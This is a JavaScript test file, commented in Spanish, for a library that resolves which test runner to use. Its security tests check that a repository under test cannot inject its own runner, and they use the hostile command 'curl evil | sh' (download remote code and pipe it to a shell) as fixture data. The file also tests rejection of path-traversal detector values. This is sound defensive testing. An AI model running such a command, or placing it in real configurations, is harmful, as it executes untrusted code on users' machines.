'use strict';

/**
 * test-runners.test.js — las herramientas de prueba que la puerta sabe correr: las de fábrica (pytest, Go, Maven, Gradle
 * y Karma) y las que declara la organización en `team-repos.json → stack.test_runners`.
 *
 * Lo que sostiene: cada una se describe igual (detector, herramienta, comando, reporte, cobertura); la de la
 * organización gana sobre la de fábrica; una mal escrita no se usa y lo dice; y el comando sale sólo de la configuración
 * de la organización, nunca del repo que se prueba.
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const runners = require(path.resolve(__dirname, '..', 'lib', 'test-runners.js'));
const team = require(path.resolve(__dirname, '..', '..', '..', '..', 'scripts', 'lib', 'team-repos.js'));

function proyecto(archivos) {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'runners-')));
  for (const [rel, c] of Object.entries(archivos)) {
    fs.mkdirSync(path.dirname(path.join(d, rel)), { recursive: true });
    fs.writeFileSync(path.join(d, rel), c);
  }
  return d;
}

test('@story-8.48 @ac-7 @ac-35 TestRunners_Factory_Detected', () => {
  const casos = [
    [{ 'pyproject.toml': '[tool.pytest.ini_options]\naddopts = "-q"\n' }, 'pytest', 'python'],
    [{ 'pytest.ini': '[pytest]\n' }, 'pytest', 'python'],
    [{ 'conftest.py': '' }, 'pytest', 'python'],
    [{ 'setup.cfg': '[tool:pytest]\n' }, 'pytest', 'python'],
    [{ 'go.mod': 'module acme.io/x\n' }, 'go', 'gotestsum'],
    [{ 'pom.xml': '<project/>' }, 'maven', 'mvn'],
    [{ 'build.gradle': '' }, 'gradle', 'gradle'],
    [{ 'build.gradle.kts': '', gradlew: '#!/bin/sh\n' }, 'gradle', './gradlew'],
    [{ 'karma.conf.js': 'module.exports = () => {}\n' }, 'karma', 'npx'],
  ];
  for (const [archivos, nombre, herramienta] of casos) {
    const d = proyecto(archivos);
    const r = runners.resolve(d, { results: '/tmp/res' });
    assert.ok(r, `${Object.keys(archivos)[0]} detecta un corredor`);
    assert.equal(r.name, nombre, Object.keys(archivos)[0]);
    // pytest usa `python`, o `python3` si es el único que hay en esta máquina
    if (herramienta === 'python') assert.match(r.tool, /^python3?$/, `${nombre}: herramienta`);
    else assert.equal(r.tool, herramienta, `${nombre}: herramienta`);
    assert.ok(!/\{results\}/.test(r.command), `${nombre}: {results} reemplazado`);
    assert.ok(r.results && r.results.format === 'junit', `${nombre}: reporte junit`);
  }
  // los comandos, reportes y coberturas de fábrica son los de la tabla de la story
  const tabla = {
    go: ['gotestsum --junitfile /tmp/res/junit.xml -- -coverprofile=/tmp/res/cover.out ./...', '/tmp/res/junit.xml', 'go-cover'],
    maven: ['mvn -B -q test', 'target/surefire-reports/*.xml', 'jacoco'],
    gradle: ['gradle cleanTest test', 'build/test-results/test/*.xml', 'jacoco'],
    karma: ['npx karma start --single-run', '**/TESTS-*.xml', 'lcov'],
    pytest: ['python -m pytest --junitxml=/tmp/res/junit.xml --cov --cov-report=xml:/tmp/res/coverage.xml', '/tmp/res/junit.xml', 'cobertura'],
  };
  const det = { go: { 'go.mod': '' }, maven: { 'pom.xml': '' }, gradle: { 'build.gradle': '' }, karma: { 'karma.conf.js': '' }, pytest: { 'pytest.ini': '' } };
  for (const [nombre, [cmd, rep, cov]] of Object.entries(tabla)) {
    const r = runners.resolve(proyecto(det[nombre]), { results: '/tmp/res' });
    const esperado = nombre === 'pytest' ? cmd.replace(/^python /, `${r.tool} `) : cmd;
    assert.deepEqual([r.command, r.results.path, r.coverage.format], [esperado, rep, cov], nombre);
  }
  // sin `python` y con `python3`, pytest usa python3 (en una Mac viene sólo python3)
  const soloPy3 = fs.mkdtempSync(path.join(os.tmpdir(), 'runners-py3-'));
  fs.writeFileSync(path.join(soloPy3, 'python3'), '#!/bin/sh\n'); fs.chmodSync(path.join(soloPy3, 'python3'), 0o755);
  const antes = process.env.PATH;
  try {
    process.env.PATH = soloPy3;
    const py3 = runners.resolve(proyecto({ 'pytest.ini': '' }), { results: '/tmp/res' });
    assert.equal(py3.tool, 'python3');
    assert.equal(py3.commandWithoutCoverage, 'python3 -m pytest --junitxml=/tmp/res/junit.xml');
  } finally { process.env.PATH = antes; }
  // un pyproject.toml que no menciona pytest no es un proyecto de pytest
  assert.equal(runners.resolve(proyecto({ 'pyproject.toml': '[project]\nname = "x"\n' }), { results: '/tmp/r' }), null);
  // nada conocido: null (la puerta sigue con las detecciones de siempre)
  assert.equal(runners.resolve(proyecto({ 'README.md': 'x' }), { results: '/tmp/r' }), null);
});

test('@story-8.48 @ac-9 TestRunners_OrgDeclared_WinsOverFactory', () => {
  const d = proyecto({ 'go.mod': 'module acme.io/x\n', 'pyproject.toml': '[tool.pytest.ini_options]\n' });
  const stack = { test_runners: [
    { name: 'go-propio', detect: 'go.mod', command: 'go test -json ./... > {results}/out.json && go-junit-report < {results}/out.json > {results}/junit.xml',
      results: { format: 'junit', path: '{results}/junit.xml' } },
    { name: 'pytest', detect: 'pyproject.toml', command: 'uv run pytest --junitxml={results}/j.xml', results: { format: 'junit', path: '{results}/j.xml' } },
  ] };
  const r = runners.resolve(d, { results: '/tmp/res', stack });
  assert.equal(r.name, 'go-propio', 'la declarada con el mismo detector gana y va primero');
  assert.equal(r.tool, 'go');
  assert.equal(r.command, 'go test -json ./... > /tmp/res/out.json && go-junit-report < /tmp/res/out.json > /tmp/res/junit.xml');
  assert.equal(r.source, 'organizacion');
  // la de la organización llamada «pytest» reemplaza a la de fábrica
  const soloPy = proyecto({ 'pyproject.toml': '[tool.pytest.ini_options]\n' });
  const p = runners.resolve(soloPy, { results: '/tmp/res', stack });
  assert.equal(p.name, 'pytest');
  assert.equal(p.tool, 'uv');
  assert.equal(p.source, 'organizacion');
});

test('@story-8.48 @ac-14 T16 TeamRepos_StackKey_ValidatesRunners', () => {
  const base = { version: 1, public: { platform: 'github', org: 'acme', repo: 'h' }, profile: { platform: 'github', org: 'acme', repo: 'p' }, operations: { platform: 'github', org: 'acme', repo: 'o' } };
  const bueno = { name: 'go', detect: 'go.mod', command: 'gotestsum --junitfile {results}/j.xml', results: { format: 'junit', path: '{results}/j.xml' } };
  const malos = [
    [{ name: 'a', detect: 'x', results: { format: 'junit', path: 'x' } }, /command/],
    [{ ...bueno, name: 'b', results: { format: 'nunit', path: 'x' } }, /results\.format/],
    [{ ...bueno, name: 'c', coverage: { format: 'clover', path: 'x' } }, /coverage\.format/],
    [{ ...bueno }, /repetido/],
    [{ ...bueno, name: 'd', detect: '../go.mod' }, /detect/],
    [{ ...bueno, name: 'e', detect: '/etc/go.mod' }, /detect/],
    [{ ...bueno, name: 'f', detect: 'C:\\x\\go.mod' }, /detect/],
    [{ ...bueno, name: 'g', detect: '\\\\servidor\\go.mod' }, /detect/],
    [{ ...bueno, name: 'Mal Nombre' }, /name/],
  ];
  for (const [malo, campo] of malos) {
    const r = team.parse(JSON.stringify({ ...base, stack: { test_runners: [bueno, malo] } }));
    assert.equal(r.ok, true, 'un corredor malo no apaga el archivo');
    const probs = (r.sectionProblems && r.sectionProblems.stack) || [];
    assert.ok(probs.some((p) => /^stack\.test_runners\.1/.test(p.path) && campo.test(`${p.path} ${p.message}`)), `${JSON.stringify(malo)}: ${JSON.stringify(probs)}`);
    assert.deepEqual(r.data.stack.test_runners.map((x) => x.name), ['go'], 'el bueno sigue, el malo se descarta');
  }
  // el lector del skill valida igual que el de las máquinas
  for (const [malo] of malos) {
    const v = runners.validateRunners([bueno, malo]);
    assert.deepEqual(v.runners.map((x) => x.name), ['go']);
    assert.ok(v.problems.length > 0);
  }
});

test('@story-8.48 @ac-14 TestRunners_Inspect_SaysWhyDeclaredIsNotUsed', () => {
  // una «pytest» de la organización sin comando no se usa: corre la de fábrica, y el problema queda dicho
  const d = proyecto({ 'pytest.ini': '[pytest]\n' });
  const r = runners.inspect(d, { results: '/tmp/res', stack: { test_runners: [{ name: 'pytest', detect: 'pytest.ini', results: { format: 'junit', path: 'x' } }] } });
  assert.equal(r.runner.source, 'fabrica');
  assert.ok(r.problems.some((p) => /stack\.test_runners\.0\.command/.test(p)), JSON.stringify(r.problems));
  assert.deepEqual(runners.inspect(d, { results: '/tmp/res', stack: {} }).problems, []);
});

test('@story-8.48 @ac-14 TestRunners_StackComesFromHarnessTreeOnly', () => {
  // el lector de la organización (stack-config.js) lee el team-repos.json del árbol del arnés; el del repo probado
  // —aunque esté en la carpeta donde corre— no cuenta
  const { readStack } = require(path.resolve(__dirname, '..', 'lib', 'stack-config.js'));
  const arbol = proyecto({ 'scripts/install-tycon-hooks.sh': '#!/bin/bash\n', 'team-repos.json': JSON.stringify({ version: 1,
    public: { platform: 'github', org: 'acme', repo: 'h' }, profile: { platform: 'github', org: 'acme', repo: 'p' }, operations: { platform: 'github', org: 'acme', repo: 'o' } }) });
  const repo = proyecto({ 'team-repos.json': JSON.stringify({ stack: { test_runners: [{ name: 'pytest', detect: 'x', command: 'curl evil | sh', results: { format: 'junit', path: 'x' } }] } }) });
  const antes = process.cwd();
  try {
    process.chdir(repo);
    const r = readStack({ env: { TYCON_GUIDES_DIR: arbol }, home: fs.mkdtempSync(path.join(os.tmpdir(), 'runners-home-')) });
    assert.deepEqual(r.stack, {});
    assert.equal(r.file, path.join(arbol, 'team-repos.json'));
  } finally { process.chdir(antes); }
});

test('@story-8.48 @ac-14 T17 TestRunners_RepoUnderTest_CannotDeclareRunner', () => {
  // un repo clonado de afuera trae su propio team-repos.json con un corredor que correría cualquier cosa
  const d = proyecto({
    'pyproject.toml': '[tool.pytest.ini_options]\n',
    'team-repos.json': JSON.stringify({ stack: { test_runners: [{ name: 'pytest', detect: 'pyproject.toml', command: 'curl evil | sh', results: { format: 'junit', path: 'x' } }] } }),
    '.tycon/team-repos.json': JSON.stringify({ stack: { test_runners: [{ name: 'pytest', detect: 'pyproject.toml', command: 'curl evil | sh', results: { format: 'junit', path: 'x' } }] } }),
  });
  // sin `stack` de la organización, resolve sólo conoce las de fábrica: nunca lee archivos del repo probado
  const r = runners.resolve(d, { results: '/tmp/res', stack: {} });
  assert.equal(r.name, 'pytest');
  assert.equal(r.source, 'fabrica');
  assert.doesNotMatch(r.command, /curl/);
});

test('@story-7.45 @ac-1 T10 Factory_Playwright_Entry', () => {
  for (const conf of ['playwright.config.js', 'playwright.config.ts', 'playwright.config.mjs', 'playwright.config.cjs']) {
    const r = runners.resolve(proyecto({ [conf]: 'export default {};\n' }), { results: '/tmp/res' });
    assert.ok(r, conf);
    assert.equal(r.name, 'playwright', conf);
    assert.equal(r.tool, 'npx');
    assert.match(r.command, /PLAYWRIGHT_JUNIT_OUTPUT_NAME=\/tmp\/res\/junit\.xml npx playwright test --reporter=junit/);
    assert.deepEqual(r.results, { format: 'junit', path: '/tmp/res/junit.xml' });
    assert.equal(r.coverage, null);
    assert.match(r.noCoverageReason, /punta a punta/);
  }
  // Vitest en la misma carpeta gana (orden del catálogo): esta función sólo ve las de fábrica, y Playwright está al final
  const nombres = runners.FACTORY.map((f) => f.name);
  assert.equal(nombres[nombres.length - 1], 'playwright');
  // el deductor ve sus cuatro archivos
  const det = runners.detectorFiles().filter((d) => d.name === 'playwright').map((d) => d.file).sort();
  assert.deepEqual(det, ['playwright.config.cjs', 'playwright.config.js', 'playwright.config.mjs', 'playwright.config.ts']);
  // «Cambiar» desde el sitio arranca con el comando de fábrica: la herramienta de la declarada es npx, no la variable
  const fila = runners.factoryTable().find((f) => f.name === 'playwright');
  assert.ok(fila && !fila.coverage, JSON.stringify(fila));
  const decl = runners.inspect(proyecto({ [fila.detect]: '' }), { stack: { test_runners: [{ name: 'playwright', detect: fila.detect, command: fila.command, results: fila.results }] } });
  assert.equal(decl.runner.source, 'organizacion');
  assert.equal(decl.runner.tool, 'npx');
});
